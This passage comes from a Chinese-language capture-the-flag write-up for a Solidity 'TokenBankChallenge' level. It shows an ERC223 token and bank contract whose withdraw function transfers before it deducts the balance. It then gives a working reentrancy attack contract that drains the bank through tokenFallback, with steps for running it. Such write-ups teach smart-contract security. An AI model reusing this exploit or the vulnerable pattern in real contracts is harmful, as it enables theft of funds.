    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18;  // half for me
        balanceOf[player] = 500000 * 10**18;      // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}
```
## 分析：
最后一个题啦很激动！！

SimpleERC223Token合约相当于是银行，TokenBankChallenge相当于记录你余额的地方。tokenFallback函数我们执行不了，只有token合约可以执行，withdraw函数可以取走银行里的钱。

withdraw函数是先转后减，这里就存在一个重入。

现在的情况就是我和部署者各有`500000000000000000000000`，TokenBankChallenge合约有`1000000000000000000000000`个token在SimpleERC223Token中，完成此关的条件是让TokenBankChallenge合约拥有0token。

首先要把我的`500000000000000000000000`转回SimpleERC223Token，然后在SimpleERC223Token中把我的钱全给攻击合约，然后攻击合约再把钱转到TokenBankChallenge合约中。这样攻击合约就有调用withdraw函数的条件了

## 攻击合约：
```
contract attack{
    SimpleERC223Token token=SimpleERC223Token(0xf8d2c1A68C3Fa15041c965432A6A1dB2D4313335);
    TokenBankChallenge target=TokenBankChallenge(0x5802016Bc9976C6f63D6170157adAeA1924586c1);
    uint256 fallbackTimes;
    function att()public {
       
         token.transfer(address(target),500000000000000000000000);
    }
    function start(){
        
        target.withdraw(500000000000000000000000);

    }
    function tokenFallback(address from, uint256 value, bytes data) external{
        
        fallbackTimes++;
        if (fallbackTimes==2){
            target.withdraw(500000000000000000000000);
        }
        
    }

    function fallback() external payable{

    }
}
```

第一次向攻击合约时不需要执行withdraw，所以tokenFallback要有限制，不然会失败。
先执行att,再执行start.然后就成功啦。

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2afe154f2d0043659a23e2bc47fb6632~tplv-k3u1fbpfcp-watermark.image?)

